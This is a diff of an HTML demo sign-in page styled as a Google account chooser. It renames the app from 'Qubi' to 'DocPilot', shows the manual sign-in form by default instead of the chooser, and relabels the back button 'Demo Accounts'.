@@ -126,7 +126,7 @@
         }
         /* Custom form view */
         .form-view {
-            display: none;
+            display: flex;
             width: 100%;
             flex-direction: column;
             gap: 16px;
@@ -223,9 +223,9 @@
         </svg>
 
         <!-- Dynamic Title and Screen Layout -->
-        <div id="chooser-view" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+        <div id="chooser-view" style="width: 100%; display: none; flex-direction: column; align-items: center;">
             <h1>Choose an account</h1>
-            <p class="subtitle">to continue to <span>Qubi</span></p>
+            <p class="subtitle">to continue to <span>DocPilot</span></p>
 
             <div class="accounts-list">
                 <!-- Account 1 -->
@@ -261,7 +261,7 @@
         <!-- Custom Account Entry Form -->
         <form id="custom-account-form" class="form-view">
             <h1>Sign in</h1>
-            <p class="subtitle">to continue to <span>Qubi</span></p>
+            <p class="subtitle">to continue to <span>DocPilot</span></p>
 
             <div class="input-group">
                 <label for="gmail-input">Google Account Email (Gmail)</label>
@@ -274,7 +274,7 @@
             </div>
 
             <div class="btn-row">
-                <button type="button" id="btn-back-chooser" class="btn-text">Back</button>
+                <button type="button" id="btn-back-chooser" class="btn-text">Demo Accounts</button>
                 <button type="submit" class="btn-blue">Next</button>
             </div>
         </form>
